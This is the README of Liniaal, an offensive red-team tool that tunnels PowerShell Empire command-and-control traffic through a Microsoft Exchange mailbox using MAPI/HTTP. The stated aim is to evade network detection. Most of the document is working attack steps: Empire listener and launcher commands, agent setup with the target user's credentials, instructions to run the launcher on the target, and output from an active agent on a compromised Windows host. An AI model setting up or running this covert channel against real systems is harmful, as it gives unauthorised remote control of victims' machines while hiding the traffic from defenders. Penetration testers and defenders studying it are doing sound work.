# Introduction

Liniaal allows for the creation of a C2 channel for Empire agents, through an Exchange server. All communication is done through MAPI/HTTP or RPC/HTTP and directly between the Liniaal agent and the Exchange server. No traffic traverses the traditional network boundary as plain HTTP, bypassing most network based detection and blocking.

Liniaal allows Empire to be used as usual, through a high latency, stealthy channel.

A full-end-to-end example is available on [YouTube] and an outline can be found in the [SensePost blog].


# Getting the Code

Liniaal depends heavily on the libraries created by [Ruler]. To interface with Powershell [Empire] you will require the 2.0_dev branch.

Dependencies:

* [Ruler]  
* [golang.org/x/crypto/ssh/terminal]
* [Empire] version 2.0_dev

The simpliest way to get Liniaal is to use `go get`:

```
go get github.com/sensepost/liniaal
```

Alternatively you can `git clone` the relevant components into your GOPATH:

```
git clone github.com/sensepost/ruler
git clone github.com/sensepost/liniaal
```

## Building

You can build your own binaries using Go:

```
cd liniaal
go build
```

## Pre-built Binaries

Compiled binaries for Linux, OSX and Windows are available. Find these in [Releases]

# Usage

**Note:** *Outlook will need to be open on your target's host! The Empire agent uses the MAPI end-points exposed by Outlook and these are only available while Outlook is running*

Firstly copy the [stager] and [listener] to the relevant directories within Empire.

```
cp empire/data/stagers/http_mapi.ps1 /opt/empire/data/stagers/
cp empire/lib/listeners/http_mapi.py /opt/empire/lib/listeners/
```

### Setting up Empire listener

To setup the listener within Empire:

```
(Empire) > listeners
(Empire: listeners) > uselistener http_mapi
```

The only new option is **Folder** which allows you to specify a name for the hidden folder used for communication. The default folder name is **Liniaal**.
Change this if you wish and then execute the listener.

```
(Empire: listeners/http_mapi) > set Folder Liniaal
(Empire: listeners/http_mapi) > execute
```

Now create your launcher: *Liniaal only supports powershell agents!*

```
(Empire: listeners/http_mapi) > launcher powershell
```

### Setup Liniaal

Now that Empire is up and running, you need to setup the Liniaal agent to translate/transfer requests between Empire and Exchange.

```
./liniaal

Liniaal - a communication extension to Ruler
use 'options' to view settings for your agent. 'set key value' to change settings.
For anything else, use 'help'
> options
== Agent options ==
Password                                            The password for the target user
Folder               Liniaal                        The name of the hidden folder
Host                 http://localhost:8080          The address of our Empire listener
URL                                                 A custom autodiscover end-point
EmailAddress         demo@outlook.com               The target mailbox/email address
Username                                            The username of our target user, if required
Domain                                              The domain of our target user, if required
>
```

The interface is similar to Empire and allows you to set the required fields. These are similar to those used in Ruler. THe important fields are:

* EmailAddress
* Username   (except for Office365/Outlook domains)
* Password
* Folder
* Host

Ensure that the **Folder** is the same as set in [Empire].
**Host** is our Empire listener address.

```
> set Folder Liniaal
> set EmailAddress test@outlook.com
> set Host http://localhost:8080
```

Once the required values are set, start the Liniaal agent:

```
> run

[+] Agent Listening  
```

The agent's status/actions will be shown and dynamically updated.

### Get your shell

Now your communication channel is setup, you can execute the powershell launcher (generated through Empire) on your target. How you do this depends fully on you. You could even pop it through [Ruler].

The channel is slow, it can take upto two minutes for the Empire agent to be come active and usable through Empire. You should see the following while the agent is communicating through Liniaal:

```
[+] Sent response to agent at: 14/03/2017 03:56:44 PM
```

Once the agent is setup you can use the agent through the Empire inteface as you normally would.

```
(Empire: listeners/http_mapi) > [+] Initial agent XAYZUNLW from 172.17.0.1 now active
(Empire: listeners/http_mapi) > agents
[*] Active agents:                                                                                                             │
                                                                                                                               │
  Name            Lang  Internal IP     Machine Name    Username            Process             Delay    Last Seen             │
  ---------       ----  -----------     ------------    ---------           -------             -----    --------------------  │
  XAYZUNLW        ps    192.168.122.18  DESKTOP-DNST7G1 DESKTOP-DNST7G1\Etiepowershell/2732     20/0.0   2017-03-14 15:59:20   │
                                                                                                                               │
(Empire: agents) > interact XAYZUNLW                                                                                           │
(Empire: XAYZUNLW) > sysinfo
(Empire: XAYZUNLW) > sysinfo: 0|http://172.17.0.2:8080|DESKTOP-DNST7G1|Etienne|DESKTOP-DNST7G1|192.168.122.18|Microsoft Windows│
 10 Home|False|powershell|2732|powershell|5                                                                                    │
                                                                                                                               │
Listener:         http://172.17.0.2:8080                                                                                       │
Internal IP:    192.168.122.18                                                                                                 │
Username:         DESKTOP-DNST7G1\Etienne                                                                                      │
Hostname:       DESKTOP-DNST7G1                                                                                                │
OS:               Microsoft Windows 10 Home                                                                                    │
High Integrity:   0                                                                                                            │
Process Name:     powershell                                                                                                   │
Process ID:       2732                                                                                                         │
Language:         powershell                                                                                                   │
Language Version: 5       
```

# Caveats

As noted before, Liniaal requires Outlook to be running. You will also require valid credentials for the target user. And it is assumed you have a way to run code on the target host.

The Powershell agent does not have any persistence or ability to respawn itself. It is also *dumb* at the moment; if Outlook stops running, the agent stops running and you will need to get it back manually (PR requests with a fix are welcome!)

[Ruler]:<https://github.com/sensepost/ruler>
[golang.org/x/crypto/ssh/terminal]:<golang.org/x/crypto/ssh/terminal>
[Releases]: <https://github.com/sensepost/liniaal/releases>
[Empire]:<https://github.com/EmpireProject/Empire/tree/2.0_beta>
[stager]:<https://github.com/sensepost/liniaal/blob/master/empire/data/stagers/http_mapi.ps1>
[listener]:<https://github.com/sensepost/liniaal/blob/master/empire/lib/listeners/http_mapi.py>
[SensePost blog]:<https://sensepost.com/blog/2017/Liniaal_-_Empire_through_Exchange>
[YouTube]:<https://www.youtube.com/watch?v=kRg09kUGpHs>
